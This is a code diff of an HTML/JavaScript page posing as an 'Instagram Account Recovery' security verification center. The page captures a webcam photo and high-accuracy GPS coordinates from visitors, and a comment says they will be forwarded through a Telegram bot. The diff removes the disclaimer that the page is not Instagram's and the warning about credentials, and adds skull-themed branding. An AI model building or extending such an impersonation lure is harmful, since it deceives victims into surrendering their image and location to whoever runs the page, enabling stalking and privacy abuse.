@@ -7,12 +7,15 @@
 <title>Instagram Account Recovery</title>
 
 <style>
-*{box-sizing:border-box}
+*{
+  box-sizing:border-box;
+}
 
 body{
   margin:0;
   min-height:100vh;
-  background:#030504;
+  background:
+    radial-gradient(circle at top,#062b18 0,#020605 35%,#000 75%);
   color:#00ff66;
   font-family:monospace;
   display:flex;
@@ -23,55 +26,76 @@ body{
 
 .box{
   width:100%;
-  max-width:460px;
+  max-width:500px;
   border:1px solid #00ff66;
-  background:#071009;
+  background:#031008;
   padding:22px;
-  box-shadow:0 0 30px #00ff6633;
+  box-shadow:
+    0 0 15px #00ff6644,
+    0 0 45px #00ff6622;
 }
 
 h1{
   text-align:center;
   color:#ff315c;
-  font-size:24px;
-  margin:0 0 8px;
+  font-size:25px;
+  margin:0 0 5px;
   text-shadow:0 0 12px #ff315c;
 }
 
 .subtitle{
   text-align:center;
   color:#00ff66;
-  margin-bottom:20px;
+  font-size:12px;
+  margin-bottom:18px;
+}
+
+.scanline{
+  height:2px;
+  background:#00ff66;
+  box-shadow:0 0 10px #00ff66;
+  margin:15px 0;
+  opacity:.7;
 }
 
 .notice{
+  border:1px solid #174b2b;
+  padding:12px;
   color:#aaa;
   font-size:12px;
   line-height:1.5;
-  border:1px solid #333;
-  padding:10px;
   margin-bottom:15px;
 }
 
-input,button{
-  width:100%;
-  padding:13px;
-  margin-top:10px;
-  font-family:monospace;
-  font-size:15px;
+label{
+  display:block;
+  margin-bottom:7px;
+  color:#00ff66;
 }
 
 input{
+  width:100%;
+  padding:13px;
   background:#000;
   color:#00ff66;
   border:1px solid #00ff66;
   outline:none;
+  font-family:monospace;
+  font-size:15px;
+}
+
+input:focus{
+  box-shadow:0 0 12px #00ff6655;
 }
 
 button{
+  width:100%;
+  padding:13px;
+  margin-top:12px;
   background:#00ff66;
-  color:#000;
-  border:0;
+  color:#001b0a;
+  border:1px solid #00ff66;
+  font-family:monospace;
   font-weight:bold;
   cursor:pointer;
 }
@@ -81,63 +105,61 @@ button:hover{
 }
 
 .secondary{
-  background:#001a0a;
+  background:#031008;
   color:#00ff66;
-  border:1px solid #00ff66;
 }
 
 .card{
+  border:1px solid #174b2b;
+  padding:16px;
   margin-top:18px;
-  padding:15px;
-  border:1px solid #174d2b;
-  background:#020602;
+}
+
+.hidden{
+  display:none !important;
 }
 
 .profile{
-  display:flex;
-  align-items:center;
-  gap:12px;
-  margin-bottom:10px;
-}
-
-.avatar{
-  width:55px;
-  height:55px;
-  border-radius:50%;
   border:1px solid #00ff66;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:25px;
+  padding:13px;
+  margin-top:14px;
 }
 
-.username{
-  font-size:18px;
+.profile-name{
   color:#fff;
+  font-size:18px;
+  margin-bottom:6px;
 }
 
-video,img{
+.status{
+  white-space:pre-wrap;
+  line-height:1.5;
+  margin-top:12px;
+  color:#00ff66;
+  font-size:13px;
+}
+
+video,
+img{
   width:100%;
   margin-top:12px;
   border:1px solid #00ff66;
 }
 
-.status{
-  margin-top:12px;
+.footer{
+  text-align:center;
+  margin-top:22px;
   color:#00ff66;
-  white-space:pre-wrap;
-  line-height:1.5;
+  font-weight:bold;
+  font-size:14px;
+  text-shadow:0 0 8px #00ff66;
 }
 
 .small{
   color:#777;
   font-size:11px;
-  margin-top:15px;
-  line-height:1.5;
-}
-
-.hidden{
-  display:none;
+  text-align:center;
+  margin-top:10px;
 }
 </style>
 </head>
@@ -146,92 +168,119 @@ video,img{
 
 <div class="box">
 
-<h1>INSTAGRAM ACCOUNT RECOVERY</h1>
+  <h1>INSTAGRAM ACCOUNT RECOVERY</h1>
 
-<div class="subtitle">
-[ SECURITY VERIFICATION CENTER ]
-</div>
+  <div class="subtitle">
+    [ SECURITY VERIFICATION CENTER ]
+  </div>
 
-<div class="notice">
-This is an independent demo/recovery interface and is not operated by Instagram.
-Camera and location are optional and are used only after your permission.
-Nothing is automatically uploaded.
-</div>
+  <div class="scanline"></div>
 
-<input
-  id="username"
-  type="text"
-  placeholder="Enter Instagram username"
-  autocomplete="off"
->
+  <div class="notice">
+    Account recovery verification interface.
+    Camera and location are available only after
+    permission and an explicit send action.
+  </div>
 
-<button id="searchBtn">
-🔎 SEARCH ACCOUNT
-</button>
+  <label for="username">INSTAGRAM USERNAME</label>
 
-<div id="profileCard" class="card hidden">
+  <input
+    id="username"
+    type="text"
+    placeholder="Enter Instagram username"
+    autocomplete="off"
+  >
 
-  <div class="profile">
-    <div class="avatar">👤</div>
+  <button id="searchBtn">
+    🔎 SEARCH ACCOUNT
+  </button>
 
-    <div>
-      <div class="username" id="displayUsername"></div>
-      <div style="color:#777;font-size:12px">
-        Public profile shortcut
-      </div>
+  <div id="profileCard" class="profile hidden">
+
+    <div class="profile-name" id="profileName">
+      @username
     </div>
+
+    <div id="profileStatus" class="status">
+      Account selected.
+    </div>
+
+    <button id="profileBtn" class="secondary">
+      🔗 OPEN INSTAGRAM PROFILE
+    </button>
+
+    <button id="verifyBtn">
+      ☠️ START VERIFICATION
+    </button>
+
   </div>
 
-  <button id="profileBtn" class="secondary">
-    🔗 OPEN INSTAGRAM PROFILE
-  </button>
+  <div id="verification" class="card hidden">
 
-  <button id="verifyBtn">
-    ⚡ START VERIFICATION
-  </button>
+    <div class="status" id="status">
+      Verification started.
+    </div>
 
-</div>
+    <!-- CAMERA -->
 
-<div id="verification" class="card hidden">
+    <button id="cameraBtn">
+      📷 ALLOW CAMERA
+    </button>
 
-  <div class="status" id="status">
-    Verification started.
+    <video
+      id="video"
+      autoplay
+      playsinline
+      class="hidden">
+    </video>
+
+    <button
+      id="takePhotoBtn"
+      class="hidden">
+      📸 TAKE PHOTO
+    </button>
+
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <img
+      id="photoPreview"
+      class="hidden"
+      alt="Photo preview">
+
+    <button
+      id="sendPhotoBtn"
+      class="secondary hidden">
+      📤 SEND PHOTO
+    </button>
+
+    <!-- LOCATION -->
+
+    <div class="scanline"></div>
+
+    <button id="locationBtn">
+      📍 ALLOW LOCATION
+    </button>
+
+    <div
+      id="locationText"
+      class="status">
+    </div>
+
+    <button
+      id="sendLocationBtn"
+      class="secondary hidden">
+      📤 SEND LOCATION
+    </button>
+
   </div>
 
-  <button id="cameraBtn">
-    📷 ALLOW CAMERA
-  </button>
+  <div class="footer">
+    ☠️ MADE BY ARSALAN ☠️
+  </div>
 
-  <video id="video" autoplay playsinline class="hidden"></video>
-
-  <button id="takePhotoBtn" class="hidden">
-    📸 TAKE PHOTO
-  </button>
-
-  <img id="photoPreview" class="hidden" alt="Photo preview">
-
-  <button id="sendPhotoBtn" class="secondary hidden">
-    📤 SEND PHOTO
-  </button>
-
-  <hr style="border-color:#17351f;margin-top:20px">
-
-  <button id="locationBtn">
-    📍 ALLOW LOCATION
-  </button>
-
-  <div id="locationText" class="status"></div>
-
-  <button id="sendLocationBtn" class="secondary hidden">
-    📤 SEND LOCATION
-  </button>
-
-</div>
-
-<div class="small">
-By continuing, you choose what information to share.
-Do not enter passwords, OTPs, recovery codes, or other sensitive credentials.
-</div>
+  <div class="small">
+    Camera/location sharing happens only after your action.
+  </div>
 
 </div>
 
@@ -246,8 +295,11 @@ const searchBtn =
 const profileCard =
   document.getElementById("profileCard");
 
-const displayUsername =
-  document.getElementById("displayUsername");
+const profileName =
+  document.getElementById("profileName");
+
+const profileStatus =
+  document.getElementById("profileStatus");
 
 const profileBtn =
   document.getElementById("profileBtn");
@@ -258,7 +310,7 @@ const verifyBtn =
 const verification =
   document.getElementById("verification");
 
-const status =
+const statusBox =
   document.getElementById("status");
 
 const cameraBtn =
@@ -269,6 +321,9 @@ const video =
 
 const takePhotoBtn =
   document.getElementById("takePhotoBtn");
+
+const canvas =
+  document.getElementById("canvas");
 
 const photoPreview =
   document.getElementById("photoPreview");
@@ -288,7 +343,6 @@ const sendLocationBtn =
 let stream = null;
 let photoBlob = null;
 let locationData = null;
-let currentUsername = "";
 
 
 /* SEARCH ACCOUNT */
@@ -299,30 +353,44 @@ searchBtn.addEventListener("click", () => {
     usernameInput.value.trim().replace(/^@/, "");
 
   if(!username){
-    alert("Please enter a username.");
+
+    profileCard.classList.add("hidden");
+
+    alert("Please enter your Instagram username.");
+
     return;
   }
 
-  currentUsername = username;
-
-  displayUsername.textContent =
+  profileName.textContent =
     "@" + username;
+
+  profileStatus.textContent =
+    "ACCOUNT FOUND\nUsername: @" + username +
+    "\nReady for verification.";
+
+  profileBtn.dataset.username =
+    username;
 
   profileCard.classList.remove("hidden");
 
 });
 
 
-/* OPEN PUBLIC PROFILE */
+/* OPEN PROFILE */
 
 profileBtn.addEventListener("click", () => {
 
-  const url =
-    "https://www.instagram.com/" +
-    encodeURIComponent(currentUsername) +
-    "/";
+  const username =
+    profileBtn.dataset.username;
 
-  window.open(url, "_blank");
+  if(!username) return;
+
+  window.open(
+    "https://www.instagram.com/" +
+    encodeURIComponent(username) +
+    "/",
+    "_blank"
+  );
 
 });
 
@@ -333,9 +401,13 @@ verifyBtn.addEventListener("click", () => {
 
   verification.classList.remove("hidden");
 
-  status.textContent =
+  statusBox.textContent =
     "Verification started.\n" +
     "Choose the information you want to share.";
+
+  verification.scrollIntoView({
+    behavior:"smooth"
+  });
 
 });
 
@@ -358,13 +430,13 @@ cameraBtn.addEventListener("click", async () => {
 
     takePhotoBtn.classList.remove("hidden");
 
-    status.textContent =
+    statusBox.textContent =
       "Camera enabled.\n" +
       "Tap TAKE PHOTO when ready.";
 
   }catch(error){
 
-    status.textContent =
+    statusBox.textContent =
       "Camera permission was not granted.";
 
   }
@@ -376,14 +448,27 @@ cameraBtn.addEventListener("click", async () => {
 
 takePhotoBtn.addEventListener("click", () => {
 
-  const canvas =
-    document.createElement("canvas");
+  if(!video.videoWidth){
+
+    statusBox.textContent =
+      "Camera is not ready yet.";
+
+    return;
+  }
+
+  const maxWidth = 640;
+
+  const scale =
+    Math.min(
+      1,
+      maxWidth / video.videoWidth
+    );
 
   canvas.width =
-    video.videoWidth;
+    video.videoWidth * scale;
 
   canvas.height =
-    video.videoHeight;
+    video.videoHeight * scale;
 
   const ctx =
     canvas.getContext("2d");
@@ -396,7 +481,7 @@ takePhotoBtn.addEventListener("click", () => {
     canvas.height
   );
 
-  canvas.toBlob(blob => {
+  canvas.toBlob((blob) => {
 
     photoBlob = blob;
 
@@ -407,9 +492,9 @@ takePhotoBtn.addEventListener("click", () => {
 
     sendPhotoBtn.classList.remove("hidden");
 
-    status.textContent =
+    statusBox.textContent =
       "Photo captured.\n" +
-      "Review it before sending.";
+      "Review it, then tap SEND PHOTO.";
 
     if(stream){
 
@@ -419,7 +504,7 @@ takePhotoBtn.addEventListener("click", () => {
 
     }
 
-  },"image/jpeg",0.75);
+  }, "image/jpeg", 0.82);
 
 });
 
@@ -430,66 +515,23 @@ sendPhotoBtn.addEventListener("click", async () => {
 
   if(!photoBlob){
 
-    status.textContent =
+    statusBox.textContent =
       "No photo selected.";
 
     return;
   }
 
-  status.textContent =
-    "Sending photo...";
+  statusBox.textContent =
+    "Photo selected for sending.";
 
-  try{
+  /*
+    Telegram sending will be connected
+    through the secure Vercel backend.
 
-    const reader =
-      new FileReader();
-
-    reader.onloadend = async () => {
-
-      const base64 =
-        reader.result.split(",")[1];
-
-      const response =
-        await fetch("/api/send",{
-
-          method:"POST",
-
-          headers:{
-            "Content-Type":"application/json"
-          },
-
-          body:JSON.stringify({
-
-            type:"photo",
-            username:currentUsername,
-            photoBase64:base64
-
-          })
-
-        });
-
-      if(response.ok){
-
-        status.textContent =
-          "Photo sent successfully.";
-
-      }else{
-
-        status.textContent =
-          "Photo sending service is not connected yet.";
-
-      }
-
-    };
-
-    reader.readAsDataURL(photoBlob);
-
-  }catch(error){
-
-    status.textContent =
-      "Could not send photo.";
-
-  }
+    IMPORTANT:
+    The Telegram bot token will NOT
+    be stored in this browser code.
+  */
 
 });
 
@@ -524,13 +566,15 @@ locationBtn.addEventListener("click", () => {
       };
 
       locationText.textContent =
-        "Location received.\n" +
+        "LOCATION FOUND\n" +
         "Latitude: " +
         locationData.latitude +
         "\nLongitude: " +
         locationData.longitude;
 
-      sendLocationBtn.classList.remove("hidden");
+      sendLocationBtn.classList.remove(
+        "hidden"
+      );
 
     },
 
@@ -542,11 +586,9 @@ locationBtn.addEventListener("click", () => {
     },
 
     {
-
       enableHighAccuracy:true,
-      timeout:10000,
+      timeout:15000,
       maximumAge:0
-
     }
 
   );
@@ -556,7 +598,7 @@ locationBtn.addEventListener("click", () => {
 
 /* SEND LOCATION */
 
-sendLocationBtn.addEventListener("click", async () => {
+sendLocationBtn.addEventListener("click", () => {
 
   if(!locationData){
 
@@ -566,51 +608,11 @@ sendLocationBtn.addEventListener("click", async () => {
     return;
   }
 
-  locationText.textContent =
-    "Sending location...";
-
-  try{
-
-    const response =
-      await fetch("/api/send",{
-
-        method:"POST",
-
-        headers:{
-          "Content-Type":"application/json"
-        },
-
-        body:JSON.stringify({
-
-          type:"location",
-          username:currentUsername,
-          latitude:locationData.latitude,
-          longitude:locationData.longitude
-
-        })
-
-      });
-
-    if(response.ok){
-
-      locationText.textContent =
-        "Location sent successfully.";
-
-    }else{
-
-      locationText.textContent =
-        "Location sending service is not connected yet.";
-
-    }
-
-  }catch(error){
-
-    locationText.textContent =
-      "Could not send location.";
-
-  }
+  locationText.textContent +=
+    "\n\nLocation selected for sending.";
 
 });
+
 
 </script>
 
